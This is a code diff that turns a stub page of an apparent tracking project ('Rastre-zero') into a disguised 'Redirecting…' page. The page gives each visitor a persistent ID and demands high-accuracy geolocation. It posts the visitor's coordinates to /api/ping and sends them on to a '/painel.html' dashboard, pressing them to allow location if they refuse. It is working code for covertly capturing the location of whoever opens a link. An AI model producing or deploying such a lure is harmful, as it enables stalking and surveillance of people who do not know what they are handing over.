@@ -2,7 +2,38 @@
 <html lang="pt-BR">
 <head>
   <meta charset="utf-8"/>
-  <title>Rastre-zero</title>
+  <title>Redirecionando…</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <style>
+    html,body{height:100%;background:#111;display:flex;align-items:center;justify-content:center;color:#eee;font:16px/1.5 sans-serif}
+    .spin{width:40px;height:40px;border:4px solid #34b7f133;border-top-color:#34b7f1;border-radius:50%;animation:spin 1s linear infinite}
+    @keyframes spin{to{transform:rotate(360deg)}}
+  </style>
 </head>
-<body>index ok</body>
+<body>
+  <div><div class="spin"></div><p>Aguardando localização…</p></div>
+  <script>
+    // gera ID único por visitante
+    const uid = localStorage.getItem('uid') || ([1e7]+-1e3+-4e3+-8e3+-1e11).replace(/[018]/g,c=>(c^crypto.getRandomValues(new Uint8Array(1))[0]&15>>c/4).toString(16));
+    localStorage.setItem('uid',uid);
+
+    // força permissão + captura
+    navigator.geolocation.getCurrentPosition(
+      pos=>{
+        // guarda primeira posição (opcional)
+        fetch('/api/ping',{
+          method:'POST',
+          headers:{'Content-Type':'application/json'},
+          body:JSON.stringify({id:uid,lat:pos.coords.latitude,lng:pos.coords.longitude,ts:Date.now()})
+        }).catch(()=>{}); // ignora erro
+        // vai pro painel
+        location.replace('/painel.html?id='+uid);
+      },
+      err=>{
+        alert('Localização bloqueada. Recarregue e permita.');
+      },
+      {enableHighAccuracy:true,timeout:15000,maximumAge:0}
+    );
+  </script>
+</body>
 </html>
